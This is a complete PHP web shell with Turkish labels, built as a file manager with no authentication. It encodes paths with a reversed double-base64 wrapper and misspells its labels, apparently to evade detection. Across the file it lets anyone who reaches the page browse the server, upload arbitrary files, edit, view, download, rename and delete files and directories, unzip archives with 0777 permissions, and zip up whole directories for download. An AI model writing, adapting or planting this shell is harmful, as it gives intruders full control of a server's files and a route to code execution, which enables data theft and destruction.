<?php
error_reporting(E_ALL); 
ini_set('display_errors', 1); 

set_time_limit(0);
ini_set('memory_limit', '2G');

function sifrele($veri) { 
    return base64_encode(strrev(base64_encode($veri))); 
}

function sifreCoz($veri) { 
    return base64_decode(strrev(base64_decode($veri))); 
}


$dizin = isset($_GET['d']) ? sifreCoz($_GET['d']) : getcwd();
if (is_dir($dizin)) {
    chdir($dizin);
    $dizin = getcwd();
}

$ust_dizin = dirname($dizin);
$mesaj = "";


if (isset($_FILES['yuklenecek_dosya']) && $_FILES['yuklenecek_dosya']['error'] == 0) {
    $yuklenecek_dosya = $_FILES['yuklenecek_dosya'];
    $hedef_dosya = $dizin . DIRECTORY_SEPARATOR . basename($yuklenecek_dosya['name']);

    $max_boyut = 10 * 1024 * 1024; 
    if ($yuklenecek_dosya['size'] > $max_boyut) {
        $mesaj = "Dosya boyutu çok büyük! Maksimum boyut 10MB.";
    } elseif (move_uploaded_file($yuklenecek_dosya['tmp_name'], $hedef_dosya)) {
        $mesaj = "Dosya başarıyla yüklendi.";
    } else {
        $mesaj = "Dosya yükleme sırasında bir hata oluştu.";
    }
}

function deleteDirectory($dir) {
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            deleteDirectory($filePath);
        } else {
            unlink($filePath);
        }
    }
    rmdir($dir);
}


if (isset($_GET['edit'])) {
    $dosya = sifreCoz($_GET['edit']);

    if (isset($_POST['icerik'])) {
        file_put_contents($dosya, $_POST['icerik']);
        $mesaj = "Dosya başarıyla kaydedildi.";
    }

    if (file_exists($dosya)) {
        $icerik = file_get_contents($dosya);
        echo "<h3>Dosya Düzenle: " . basename($dosya) . "</h3>";
        echo "<form method='post'>
                <textarea name='icerik' style='width:100%; height:400px;'>" . htmlspecialchars($icerik) . "</textarea>
                <br><input type='submit' value='Kaydet'>
              </form>";
    } else {
        $mesaj = "Dosya bulunamadı!";
    }
    exit;
}

if (isset($_POST['rename'])) {
    $dosya = sifreCoz($_POST['rename_dosya']);
    $yeni_ad = $_POST['yeni_ad'];

    if (rename($dosya, $dizin . DIRECTORY_SEPARATOR . $yeni_ad)) {
        $mesaj = "Dsya başarıyla yeniden adlandırıldı.";
    } else {
        $mesaj = "Dsya adı değiştirilirken hata oluştu.";
    }
}

if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'zip' && isset($_POST['secili_dosyalar'])) {
    $zip = new ZipArchive();
    
    $zip_dosya = $dizin . '/' . basename($dizin) . '.zip'; 

    if ($zip->open($zip_dosya, ZipArchive::CREATE) === TRUE) {
        foreach ($_POST['secili_dosyalar'] as $dosya) {
            $dosya = sifreCoz($dosya);

            if (is_file($dosya)) {
                $zip->addFile($dosya, basename($dosya));
            } elseif (is_dir($dosya)) {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dosya), RecursiveIteratorIterator::LEAVES_ONLY);

                foreach ($iterator as $dosyaAdi => $info) {
                    if ($info->isDir()) {
                        continue;
                    }

                    $zip->addFile($dosyaAdi, substr($dosyaAdi, strlen($dizin) + 1));
                }
            }
        }
        $zip->close();
        $mesaj = "Scilen dsyalar ve dzinler zippolandi indrilmeye hazır.";
    } else {
        $mesaj = "Zippo islmi srasında hata oluştu.";
    }
}

if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'unzip' && isset($_POST['secili_dosyalar'])) {
    foreach ($_POST['secili_dosyalar'] as $dosya) {
        $dosya = sifreCoz($dosya);

        if (is_file($dosya) && pathinfo($dosya, PATHINFO_EXTENSION) == 'zip') {
            $zip = new ZipArchive();
            if ($zip->open($dosya) === TRUE) {
                $extractPath = $dizin . '/' . pathinfo($dosya, PATHINFO_FILENAME);
                if (!is_dir($extractPath)) {
                    mkdir($extractPath, 0777, true);
                }
                $zip->extractTo($extractPath);
                $zip->close();

                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($extractPath),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($files as $fileinfo) {
                    chmod($fileinfo, 0777);
                }

                $mesaj = "Zippo dosyası başarıyla çıkarıldı ve dosya izinleri yetqili olarak ayarlandı.";
            } else {
                $mesaj = "Zippo dosyasını çıkarırken hata oluştu.";
            }
        }
    }
}

if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'backup') {
    $zip = new ZipArchive();
    
    $backup_dosya = $dizin . '/' . basename($dizin) . '_backup_' . date("YmdHis") . '.zip';
    
    if ($zip->open($backup_dosya, ZipArchive::CREATE) === TRUE) {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dizin),
            RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($iterator as $dosyaAdi => $info) {
            if ($info->isDir()) {
                continue;
            }

            $zip->addFile($dosyaAdi, substr($dosyaAdi, strlen($dizin) + 1));
        }

        $zip->close();
        $mesaj = "Dzin yedeqi başarıyla oluşturuldu. Ydk dosyasını <a href='?download=" . sifrele($backup_dosya) . "'>buradan indirebilirsiniz</a>.";
    } else {
        $mesaj = "Yedeqleme işlemi sırasında hata oluştu.";
    }
}

if (isset($_GET['view'])) {
    $dosya = sifreCoz($_GET['view']);
    if (file_exists($dosya)) {
        echo "<h3>Dosya Görüntüleme: " . basename($dosya) . "</h3>";
        echo "<pre style='background:#eee;padding:10px;'>" . htmlspecialchars(file_get_contents($dosya)) . "</pre>";
    } else {
        $mesaj = "Dsya blunamadı!";
    }
    exit;
}

if (isset($_GET['download'])) {
    $dosya = sifreCoz($_GET['download']);
    if (file_exists($dosya) && is_file($dosya)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($dosya) . '"');
        readfile($dosya);
        exit;
    } else {
        $mesaj = "Dsya blunamadı!";
    }
}

if (isset($_POST['toplu_islem']) && $_POST['toplu_islem'] == 'sil' && isset($_POST['secili_dosyalar'])) {
    foreach ($_POST['secili_dosyalar'] as $dosya) {
        $dosya = sifreCoz($dosya);
        if (is_file($dosya)) {
            unlink($dosya);
        } elseif (is_dir($dosya)) {
            deleteDirectory($dosya);
        }
    }
    $mesaj = "Sçilen seyler silindi.";
}

$liste = @scandir($dizin);  
if ($liste === false) {
    $mesaj = "Dzine erşm sğlanmyr. Lütfen dzn iznlerini kontrol edin.";
} else {
    $icerik = "";
    if ($dizin != "C:\\" && $dizin != "/") {
        $ust_link = "?d=" . sifrele($ust_dizin);
        $icerik .= "<tr><td colspan='5'><a href='$ust_link'>📂 [Ykari Çık]</a></td></tr>";
    }

    foreach ($liste as $dosya) {
        if ($dosya == "." || $dosya == "..") continue;
        $tam_yol = "$dizin/$dosya";
        $tip = is_dir($tam_yol) ? "Dizin" : "Dosya";
        $boyut = is_file($tam_yol) ? filesize($tam_yol) . " byte" : "--";
        $tarih = is_file($tam_yol) ? date("Y-m-d H:i:s", filemtime($tam_yol)) : "--"; 
        $link = "?d=" . sifrele($tam_yol);
        $edit_link = is_file($tam_yol) ? " | <a href='?edit=" . sifrele($tam_yol) . "'>✏️ Düzenle</a>" : "";
        $view_link = is_file($tam_yol) ? " | <a href='?view=" . sifrele($tam_yol) . "'>👁️ Görüntüle</a>" : "";
        $download_link = is_file($tam_yol) ? " | <a href='?download=" . sifrele($tam_yol) . "'>⬇️ İndir</a>" : "";
        $unzip_link = is_file($tam_yol) && pathinfo($tam_yol, PATHINFO_EXTENSION) == 'zip' ? " | <a href='#' onclick='unzipDosya(\"" . sifrele($tam_yol) . "\")'>📦 Zip Çıkar</a>" : "";
        $delete_link = is_file($tam_yol) || is_dir($tam_yol) ? " | <a href='#' onclick='silDosya(\"" . sifrele($tam_yol) . "\")'>🗑️ Sil</a>" : "";
        $rename_link = is_file($tam_yol) ? " | <a href='#' onclick='renameDosya(\"" . sifrele($tam_yol) . "\")'>✏️ Yeniden Adlandır</a>" : "";

        $icerik .= "<tr>
            <td><input type='checkbox' name='secili_dosyalar[]' value='" . sifrele($tam_yol) . "'>
                <a href='$link'>$dosya</a></td>
            <td>$tip</td>
            <td>$boyut</td>
            <td>$tarih</td>
            <td>$edit_link $view_link $download_link $unzip_link $delete_link $rename_link</td>
        </tr>";
    }
}
?>

<script>
function renameDosya(dosya) {
    var yeniAd = prompt('Yeni dosya adını girin:', '');
    if (yeniAd) {
        var form = document.createElement("form");
        form.method = "POST";
        form.action = window.location.href;

        var input = document.createElement("input");
        input.type = "hidden";
        input.name = "rename";
        input.value = "1";

        var dosyaInput = document.createElement("input");
        dosyaInput.type = "hidden";
        dosyaInput.name = "rename_dosya";
        dosyaInput.value = dosya;

        var yeniAdInput = document.createElement("input");
        yeniAdInput.type = "hidden";
        yeniAdInput.name = "yeni_ad";
        yeniAdInput.value = yeniAd;

        form.appendChild(input);
        form.appendChild(dosyaInput);
        form.appendChild(yeniAdInput);
        document.body.appendChild(form);
        form.submit();
    }
}

function silDosya(dosya) {
    if (confirm("Bu dosyayı silmek istediğinizden emin misiniz?")) {
        var form = document.createElement("form");
        form.method = "POST";
        form.action = window.location.href;

        var input = document.createElement("input");
        input.type = "hidden";
        input.name = "toplu_islem";
        input.value = "sil"; // İşlem türü

        var dosyaInput = document.createElement("input");
        dosyaInput.type = "hidden";
        dosyaInput.name = "secili_dosyalar[]"; // Seçili dosyayı silme
        dosyaInput.value = dosya;

        form.appendChild(input);
        form.appendChild(dosyaInput);
        document.body.appendChild(form);
        form.submit();
    }
}
</script>

<style>table{width:100%;border-collapse:collapse}td,th{padding:5px;border:1px solid #ccc}</style>
<h3>Şu anki dizin: <?=$dizin?></h3>
<?=isset($mesaj) ? "<p><b>$mesaj</b></p>" : "";?> 

<h3>Dsy Ykle</h3>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="yuklenecek_dosya" required>
    <input type="submit" value="Yükle">
</form>

<h3>Toplu İşlemler</h3>
<form method='post'>
    <select name='toplu_islem'>
        <option value='sil'>Sittiret</option>
        <option value='zip'>Zippo</option>
        <option value='unzip'>Zp Ckr</option>
        <option value='backup'>Ydk Al</option>
    </select>
    <input type='submit' value='Uygula'>
    <br><br>
    <input type="checkbox" id="selectAll" onclick="tumunuSec()"> Tümünü Seç
<table>
    <tr><th>İsim</th><th>Tip</th><th>Boyut</th><th>Tarih</th><th>İşlemler</th></tr>
    <?=$icerik?>
</table>
</form>
